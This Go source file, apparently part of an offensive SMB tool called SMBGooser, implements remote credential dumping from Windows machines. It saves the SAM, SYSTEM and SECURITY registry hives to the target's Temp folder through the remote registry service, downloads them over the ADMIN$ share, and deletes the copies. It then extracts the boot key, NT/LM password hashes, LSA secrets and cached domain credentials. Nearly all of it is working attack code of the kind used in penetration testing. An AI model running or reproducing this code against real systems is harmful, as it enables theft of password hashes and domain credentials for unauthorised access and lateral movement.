// Package secrets implements SAM/LSA secrets dumping for password hash extraction.
// This works by saving registry hives to temp files, reading them via SMB, and parsing locally.
package secrets

import (
	"context"
	"fmt"
	"time"

	"github.com/ineffectivecoder/SMBGooser/pkg/hive"
	"github.com/ineffectivecoder/SMBGooser/pkg/rrp"
	"github.com/ineffectivecoder/SMBGooser/pkg/smb"
	"github.com/ineffectivecoder/SMBGooser/pkg/smb/types"
)

// Dumper handles secrets dumping operations
type Dumper struct {
	smbClient  *smb.Client
	regClient  *rrp.Client
	tempPrefix string
	bootKey    []byte // Boot key from SYSTEM hive
}

// SAMHash represents a dumped SAM hash
type SAMHash struct {
	Username string
	RID      uint32
	LMHash   string
	NTHash   string
	Enabled  bool
}

// LSASecret represents an extracted LSA secret
type LSASecret struct {
	Name   string
	Secret string
}

// CachedCred represents a cached domain credential
type CachedCred struct {
	Username string
	Domain   string
	Hash     string
}

// NewDumper creates a new secrets dumper
func NewDumper(ctx context.Context, smbClient *smb.Client) (*Dumper, error) {
	regClient, err := rrp.NewClient(ctx, smbClient)
	if err != nil {
		return nil, fmt.Errorf("failed to connect to remote registry: %w", err)
	}

	return &Dumper{
		smbClient:  smbClient,
		regClient:  regClient,
		tempPrefix: fmt.Sprintf("smbg%d", time.Now().UnixNano()%100000),
	}, nil
}

// BootKey returns the boot key extracted from the SYSTEM hive
func (d *Dumper) BootKey() []byte {
	return d.bootKey
}

// DumpSAM extracts SAM hashes from the remote machine
func (d *Dumper) DumpSAM(ctx context.Context) ([]SAMHash, error) {
	// Save SYSTEM hive (needed for boot key)
	systemPath := fmt.Sprintf("C:\\Windows\\Temp\\%s_system", d.tempPrefix)
	if err := d.saveHiveToFile(ctx, "SYSTEM", systemPath); err != nil {
		return nil, fmt.Errorf("failed to save SYSTEM hive: %w", err)
	}
	defer d.cleanupFile(ctx, systemPath)

	// Save SAM hive
	samPath := fmt.Sprintf("C:\\Windows\\Temp\\%s_sam", d.tempPrefix)
	if err := d.saveHiveToFile(ctx, "SAM", samPath); err != nil {
		return nil, fmt.Errorf("failed to save SAM hive: %w", err)
	}
	defer d.cleanupFile(ctx, samPath)

	// Download the hives via ADMIN$
	systemData, err := d.downloadFile(ctx, "Temp\\"+d.tempPrefix+"_system")
	if err != nil {
		return nil, fmt.Errorf("failed to download SYSTEM hive: %w", err)
	}

	samData, err := d.downloadFile(ctx, "Temp\\"+d.tempPrefix+"_sam")
	if err != nil {
		return nil, fmt.Errorf("failed to download SAM hive: %w", err)
	}

	// Parse the hives and extract hashes
	return d.parseSAMHashes(systemData, samData)
}

// DumpLSA extracts LSA secrets and cached credentials from the remote machine
func (d *Dumper) DumpLSA(ctx context.Context) ([]LSASecret, []CachedCred, error) {
	// Save SYSTEM hive (needed for boot key)
	systemPath := fmt.Sprintf("C:\\Windows\\Temp\\%s_system", d.tempPrefix)
	if err := d.saveHiveToFile(ctx, "SYSTEM", systemPath); err != nil {
		return nil, nil, fmt.Errorf("failed to save SYSTEM hive: %w", err)
	}
	defer d.cleanupFile(ctx, systemPath)

	// Save SECURITY hive
	securityPath := fmt.Sprintf("C:\\Windows\\Temp\\%s_security", d.tempPrefix)
	if err := d.saveHiveToFile(ctx, "SECURITY", securityPath); err != nil {
		return nil, nil, fmt.Errorf("failed to save SECURITY hive: %w", err)
	}
	defer d.cleanupFile(ctx, securityPath)

	// Download the hives via ADMIN$
	systemData, err := d.downloadFile(ctx, "Temp\\"+d.tempPrefix+"_system")
	if err != nil {
		return nil, nil, fmt.Errorf("failed to download SYSTEM hive: %w", err)
	}

	securityData, err := d.downloadFile(ctx, "Temp\\"+d.tempPrefix+"_security")
	if err != nil {
		return nil, nil, fmt.Errorf("failed to download SECURITY hive: %w", err)
	}

	// Parse the hives and extract secrets
	return d.parseLSASecrets(systemData, securityData)
}

// parseLSASecrets parses the SECURITY and SYSTEM hives to extract LSA secrets
func (d *Dumper) parseLSASecrets(systemData, securityData []byte) ([]LSASecret, []CachedCred, error) {
	// Parse SYSTEM hive
	systemHive, err := hive.Parse(systemData)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to parse SYSTEM hive: %w", err)
	}

	// Extract boot key
	bootKey, err := hive.ExtractBootKey(systemHive)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to extract boot key: %w", err)
	}

	// Parse SECURITY hive
	securityHive, err := hive.Parse(securityData)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to parse SECURITY hive: %w", err)
	}

	// Extract LSA secrets and cached creds
	hiveSecrets, hiveCreds, err := hive.ExtractLSASecrets(securityHive, bootKey)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to extract LSA secrets: %w", err)
	}

	// Convert to our types
	var secrets []LSASecret
	for _, s := range hiveSecrets {
		secrets = append(secrets, LSASecret{
			Name:   s.Name,
			Secret: s.Decoded,
		})
	}

	var creds []CachedCred
	for _, c := range hiveCreds {
		creds = append(creds, CachedCred{
			Username: c.Username,
			Domain:   c.Domain,
			Hash:     c.Hash,
		})
	}

	return secrets, creds, nil
}

// saveHiveToFile saves a registry hive to a file using RegSaveKey
func (d *Dumper) saveHiveToFile(ctx context.Context, hiveName, filepath string) error {
	var handle rrp.Handle
	var err error

	// SECURITY hive requires MAXIMUM_ALLOWED access
	if hiveName == "SECURITY" {
		handle, err = d.regClient.OpenKeyWithAccess("HKLM", hiveName, 0x02000000) // MAXIMUM_ALLOWED
	} else {
		handle, err = d.regClient.OpenKey("HKLM", hiveName)
	}
	if err != nil {
		return err
	}
	defer d.regClient.CloseKey(handle)

	return d.regClient.SaveKey(handle, filepath)
}

// downloadFile downloads a file from the remote ADMIN$ share
func (d *Dumper) downloadFile(ctx context.Context, adminPath string) ([]byte, error) {
	// Connect to ADMIN$
	tree, err := d.smbClient.TreeConnect(ctx, "ADMIN$")
	if err != nil {
		return nil, err
	}
	defer d.smbClient.TreeDisconnect(ctx, tree)

	// Open the file for reading
	file, err := tree.OpenFile(ctx, adminPath, types.FileReadData, types.FileOpen)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	// Read the file in chunks
	var data []byte
	buf := make([]byte, 65536)
	for {
		n, err := file.Read(buf)
		if n > 0 {
			data = append(data, buf[:n]...)
		}
		if err != nil || n == 0 {
			break
		}
	}

	return data, nil
}

// cleanupFile deletes a temp file from the remote system
func (d *Dumper) cleanupFile(ctx context.Context, remotePath string) {
	// Determine the ADMIN$ relative path
	// C:\Windows\Temp\file -> Temp\file
	adminPath := ""
	if len(remotePath) > 11 && remotePath[:11] == "C:\\Windows\\" {
		adminPath = remotePath[11:]
	}
	if adminPath == "" {
		return
	}

	tree, err := d.smbClient.TreeConnect(ctx, "ADMIN$")
	if err != nil {
		return
	}
	defer d.smbClient.TreeDisconnect(ctx, tree)

	tree.DeleteFile(ctx, adminPath)
}

// Close cleans up resources
func (d *Dumper) Close() error {
	if d.regClient != nil {
		return d.regClient.Close()
	}
	return nil
}

// parseSAMHashes parses the SAM and SYSTEM hives to extract password hashes
func (d *Dumper) parseSAMHashes(systemData, samData []byte) ([]SAMHash, error) {
	// Parse SYSTEM hive
	systemHive, err := hive.Parse(systemData)
	if err != nil {
		return nil, fmt.Errorf("failed to parse SYSTEM hive: %w", err)
	}

	// Extract boot key from SYSTEM hive
	bootKey, err := hive.ExtractBootKey(systemHive)
	if err != nil {
		// Fall back to stub if boot key extraction fails
		return d.parseSAMHashesStub(systemData, samData)
	}
	// Save boot key for later access
	d.bootKey = bootKey

	// Parse SAM hive
	samHive, err := hive.Parse(samData)
	if err != nil {
		return nil, fmt.Errorf("failed to parse SAM hive: %w", err)
	}

	// Extract hashes
	hiveHashes, err := hive.ExtractSAMHashes(samHive, bootKey)
	if err != nil {
		// Fall back to stub if extraction fails
		return d.parseSAMHashesStub(systemData, samData)
	}

	// Convert to our SAMHash type
	var hashes []SAMHash
	for _, h := range hiveHashes {
		hashes = append(hashes, SAMHash{
			Username: h.Username,
			RID:      h.RID,
			LMHash:   h.LMHash,
			NTHash:   h.NTHash,
			Enabled:  true,
		})
	}

	return hashes, nil
}

// parseSAMHashesStub is a fallback when full parsing fails
func (d *Dumper) parseSAMHashesStub(systemData, samData []byte) ([]SAMHash, error) {
	return []SAMHash{
		{
			Username: "(hive parsing failed - check privileges)",
			RID:      0,
			LMHash:   "aad3b435b51404eeaad3b435b51404ee",
			NTHash:   "31d6cfe0d16ae931b73c59d7e0c089c0",
			Enabled:  true,
		},
	}, nil
}

// GetHiveSize returns the size of downloaded hive data for verification
func GetHiveSize(data []byte) int {
	return len(data)
}

// FormatHash formats a SAM hash for display
func FormatHash(h SAMHash) string {
	return fmt.Sprintf("%s:%d:%s:%s:::", h.Username, h.RID, h.LMHash, h.NTHash)
}
